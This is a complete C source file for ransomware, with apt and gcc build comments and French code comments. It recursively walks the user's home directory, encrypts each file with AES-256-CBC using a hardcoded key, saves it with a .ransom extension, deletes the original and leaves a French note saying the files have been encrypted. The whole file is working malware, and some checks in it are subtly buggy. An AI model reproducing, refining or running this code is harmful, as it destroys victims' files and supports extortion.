#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <pwd.h>
#define _GNU_SOURCE

 // sudo apt-get update -y 
 // sudo apt-get install -y libssl-dev
 // gcc ransom.c -o ransomware -lcrypto 

void unencrypted_Files(char *path);
char * get_home_dir();
void encrypt_files(FILE *fpin,FILE* fpout,unsigned char* key, unsigned char* iv);

int main()
{
  char path[1000];
  char* home = get_home_dir();
  strcpy(path,home);
  unencrypted_Files(path);
}

void unencrypted_Files(char *path)
{
  char newPath[1000];
  unsigned char key[] = "12345678901234561234567890123456";
  unsigned char iv[] = "1234567890123456";

  // crée une structure représentant l'entrée courante du répertoire
  struct dirent *entry;

  // Ouvre le répertoire Stream et l'assigne au pointeur dir de type DIR
  DIR *direc = opendir(path);

  // impossible d'ouvrir le flux du répertoire 
  if(direc==NULL){
    printf("Error Opening file\n");
    return;
  }
  while((entry = readdir(direc)) != NULL)
  {
      printf("Success!\n");
      printf("%s\n",path);
      int len = strlen(entry->d_name);
      const char* suff = &entry->d_name[len-9];
      if(strcmp(suff,".ransom")!=0){
	      if(strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name,"..") != 0)
	      {
		if((entry->d_type)==4){
	          printf("Directory: %s\n",entry->d_name);
		  strcpy(newPath, path);
		  strcat(newPath,"/");
		  strcat(newPath,entry->d_name);
	          printf("New Path: [%s]\n",newPath);


		  unencrypted_Files(newPath);
		}
		else if((entry->d_type) == 8){
			char *infoPath = (char*)malloc(strlen("RANSOMWARE_INFO.txt")+strlen(path)+2);
			strcpy(infoPath,path);
			strcat(infoPath,"/");
			strcat(infoPath,"RANSOMWARE_INFO.txt");
			printf("%s Full Path\n",infoPath);
			char *fullPath2 = (char*)malloc(strlen(entry->d_name)+strlen(path)+2);
			strcpy(fullPath2,path);
			strcat(fullPath2,"/");
			strcat(fullPath2,entry->d_name);
			printf("%s %s Full Path2\n",path,fullPath2);

			char *new_name = (char*)malloc(strlen(fullPath2)+strlen(".ransom")+1);
			strcpy(new_name,fullPath2);
			strcat(new_name,".ransom");
			printf("%s New Name\n", new_name);

			if(strcmp(fullPath2,"etc/passwd")!=0 && strcmp(fullPath2, "/etc/shadow")!=0 && strcmp(fullPath2, "/etc/sudoers") !=0)
			{
				FILE* fpin;
				FILE* fpout;
				FILE* fpreadme;
				FILE* newfile;


				printf("%s\n",fullPath2);
		
				fpin= fopen(fullPath2,"rb");
				fpout = fopen(new_name,"wb");
				fpreadme = fopen(infoPath,"w");
				if(fpin == NULL){
					printf("Error! File is NULL\n");
					break;
				}

				fprintf(fpreadme, "Vous avez ete infecte par le Ransomware Tous les fichiers dans ce repertoire ont ete crypte > :)");

				fclose(fpreadme);

				encrypt_files(fpin,fpout,key,iv);

				fclose(fpin);
				fclose(fpout);
		
				remove(fullPath2);
			}
			//free(fullPath2);
			//free(new_name);
		}

		// Si le d_type est inconnu alors print
		#ifdef _DIRENT_HAVE_D_TYPE
		else if((entry->d_type) == DT_UNKNOWN){
		  printf("Data Type Unknown\n\n\n");
		}
		#endif
		// Créer un nouveau chemin basé sur le répertoire et appeler récursivement unencrypted_Files
	      }
	}
    }
  // Fermer le flux du répertoire 
  closedir(direc);
}


// Cette fonction retournera le chemin vers le répertoire personnel 
char * get_home_dir()
{
  uid_t uid = getuid();

  struct passwd *pw = getpwuid(uid);

  if (pw ==NULL){
    return 0;
  }

  return(pw->pw_dir);
}



void encrypt_files(FILE *fpin,FILE* fpout, unsigned char* key, unsigned char* iv)
{
	printf("IN Encrypt files");
	const unsigned bufsize = 4096;
	unsigned char* read_buf = malloc(bufsize);
	unsigned char* cipher_buf;
	unsigned blocksize;
	int out_len;

	EVP_CIPHER_CTX *ctx;
	ctx = EVP_CIPHER_CTX_new();

	EVP_CipherInit(ctx,EVP_aes_256_cbc(),key,iv,1);
	
	blocksize = EVP_CIPHER_CTX_block_size(ctx);
	cipher_buf = malloc(bufsize+blocksize);
	
	// lire le fichier et écrire dans le fichier crypté jusqu'à EOF 

	while(1)
	{	if(fpin == NULL){
			printf("Erreur! Le fichier est NULL");
			break;
		}
		int bytes_read = fread(read_buf,sizeof(unsigned char), bufsize, fpin);
		EVP_CipherUpdate(ctx, cipher_buf, &out_len, read_buf, bytes_read);
		fwrite(cipher_buf,sizeof(unsigned char), out_len, fpout);
		if(bytes_read < bufsize){
			break;
		}
	}

	EVP_CipherFinal(ctx, cipher_buf, &out_len);
	fwrite(cipher_buf,sizeof(unsigned char), out_len, fpout);
	

	free(cipher_buf);
	free(read_buf);


  }
